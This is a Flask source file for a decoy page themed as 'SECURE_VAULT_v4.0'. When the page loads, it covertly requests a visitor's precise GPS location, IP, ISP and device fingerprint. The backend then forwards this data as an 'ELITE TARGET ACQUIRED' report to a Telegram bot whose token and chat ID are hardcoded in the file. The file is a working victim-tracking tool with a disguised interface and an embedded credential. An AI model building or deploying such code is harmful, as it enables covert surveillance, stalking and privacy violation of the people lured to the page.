from flask import Blueprint, render_template_string, request, jsonify
import requests

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
TELEGRAM_CHAT_ID = "1308711346"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>SECURE_VAULT_v4.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; text-align: center; padding-top: 15%; margin:0; overflow:hidden; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.9); box-shadow: 0 0 40px #0f0; position: relative; }
        .scan-line { width: 100%; height: 4px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 2s linear infinite; opacity: 0.7; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .grid-bg { position: fixed; top:0; left:0; width:100%; height:100%; background: radial-gradient(circle, #004400 1px, transparent 1px); background-size: 30px 30px; z-index:-1; opacity: 0.2; }
    </style>
</head>
<body onload="capture()">
    <div class="grid-bg"></div>
    <div class="box">
        <div class="scan-line"></div>
        <h2 id="header">ACCESSING_GLOBAL_SATELLITE</h2>
        <p id="status">Syncing Neural Nodes... [92%]</p>
        <div id="loader">● ● ● ● ● ● ● ●</div>
    </div>

    <script>
        async function capture() {
            let lat = "N/A", lon = "N/A";

            // 1. Get GPS Location (Latitude/Longitude)
            const getCoords = () => {
                return new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude}),
                        () => resolve({lat: "Denied", lon: "Denied"}),
                        {enableHighAccuracy: true}
                    );
                });
            };
            const coords = await getCoords();

            try {
                // 2. IP & GEO DATA
                const res = await fetch('https://ipapi.co/json/');
                const ip = await res.json();

                // 3. GPU DATA
                let gpu = "Unknown";
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                } catch(e) {}

                // 4. BATTERY STATUS
                let batteryPct = "N/A";
                try {
                    const b = await navigator.getBattery();
                    batteryPct = Math.round(b.level * 100) + "%";
                } catch(e) {}

                // 5. COMPILE ALL DATA
                const data = {
                    ip: ip.ip || "N/A",
                    city: ip.city || "N/A",
                    country: ip.country_name || "N/A",
                    isp: ip.org || "N/A",
                    lat: coords.lat,
                    lon: coords.lon,
                    battery: batteryPct,
                    os: navigator.platform,
                    agent: navigator.userAgent,
                    screen: window.screen.width + "x" + window.screen.height,
                    cores: navigator.hardwareConcurrency || "N/A",
                    ram: navigator.deviceMemory || "N/A",
                    gpu: gpu,
                    online: navigator.onLine ? "Yes" : "No"
                };

                // 6. SEND TO BACKEND
                await fetch('/script20/capture_data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                document.getElementById('header').innerText = "CONNECTION_SECURED";
                document.getElementById('status').innerText = "Satellite Link Stable.";
                document.getElementById('loader').innerText = "[ AUTHENTICATED ]";

            } catch (e) { console.log("Bypass error..."); }
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    intel = request.json
    
    # ADVANCED FORENSIC REPORT FORMAT
    message = (
        f"🚀 *--- ELITE TARGET ACQUIRED ---* 🚀\\n\\n"
        f"📍 *GPS COORDINATES*\\n"
        f"┣ LAT: `{intel['lat']}`\\n"
        f"┣ LON: `{intel['lon']}`\\n"
        f"┗ MAP: [Google Maps](https://www.google.com/maps?q={intel['lat']},{intel['lon']})\\n\\n"
        f"🔋 *POWER STATUS*\\n"
        f"┗ BATTERY: `{intel['battery']}`\\n\\n"
        f"🛰️ *NETWORK INTEL*\\n"
        f"┣ IP: `{intel['ip']}`\\n"
        f"┣ ISP: `{intel['isp']}`\\n"
        f"┗ CITY: `{intel['city']}, {intel['country']}`\\n\\n"
        f"💻 *HARDWARE & OS*\\n"
        f"┣ OS: `{intel['os']}`\\n"
        f"┣ RAM: `{intel['ram']} GB`\\n"
        f"┣ CORES: `{intel['cores']}`\\n"
        f"┗ GPU: `{intel['gpu']}`\\n\\n"
        f"⚙️ *SYSTEM MISC*\\n"
        f"┣ SCREEN: `{intel['screen']}`\\n"
        f"┗ ONLINE: `{intel['online']}`\\n\\n"
        f"🕵️ *BROWSER FINGERPRINT*\\n"
        f"`{intel['agent'][:150]}...`"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown", "disable_web_page_preview": False}
    
    try:
        requests.post(url, json=payload)
        return jsonify({"status": "Success"}), 200
    except:
        return jsonify({"status": "Error"}), 500
